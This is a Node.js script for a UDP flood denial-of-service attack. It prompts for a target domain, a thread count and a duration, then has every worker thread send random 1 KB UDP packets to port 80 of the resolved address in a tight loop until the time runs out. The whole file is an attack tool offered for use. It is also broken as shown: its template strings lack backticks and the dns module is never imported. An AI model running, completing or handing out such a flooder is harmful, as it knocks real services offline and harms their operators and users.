const dgram = require('dgram');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let site, threadCount, duration;

rl.question('Enter your site URL (e.g., example.com) => ', (answer) => {
    site = answer;
    rl.question('Enter the number of threads => ', (answer) => {
        threadCount = parseInt(answer);
        rl.question('Enter the attack duration (in seconds) => ', (answer) => {
            duration = parseInt(answer) * 1000;
            rl.close();
            startAttack();
        });
    });
});

function startAttack() {

    dns.lookup(site, (err, ip) => {
        if (err) {
            console.error('Error: Could not resolve the domain name. Please check the URL or your internet connection.');
            process.exit(1);
        }

        console.log(Starting attack on ${ip} with ${threadCount} threads for ${duration / 1000} seconds...);

        for (let i = 0; i < threadCount; i++) {
            const worker = new Worker(__filename, {
                workerData: { ip, duration, threadId: i }
            });

            worker.on('message', (message) => {
                console.log(message);
            });

            worker.on('error', (error) => {
                console.error(Error in thread ${i}:, error);
            });

            worker.on('exit', (code) => {
                if (code !== 0) {
                    console.error(Thread ${i} stopped with exit code ${code});
                }
            });
        }
    });
}


function generateRandomMessage(size = 1024) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let message = '';
    for (let i = 0; i < size; i++) {
        message += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return message;
}

if (!isMainThread) {
    const { ip, duration, threadId } = workerData;
    const UDP_PORT = 80;
    const MESSAGE = generateRandomMessage();
    const client = dgram.createSocket('udp4');

    const startTime = Date.now();
    let packetCount = 0;


    const sendPacket = () => {
        if (Date.now() - startTime < duration) {
            client.send(MESSAGE, 0, MESSAGE.length, UDP_PORT, ip, (err) => {
                if (err) {
                    parentPort.postMessage(Error in thread ${threadId}: ${err.message});
                } else {
                    packetCount++;
                    if (packetCount % 100 === 0) {
                        parentPort.postMessage(Packet sent from thread ${threadId}. Total packets: ${packetCount});
                    }
                }
                setImmediate(sendPacket);
            });
        } else {
            client.close();
            parentPort.postMessage(Thread ${threadId} finished.);
        }
    };

    sendPacket();
}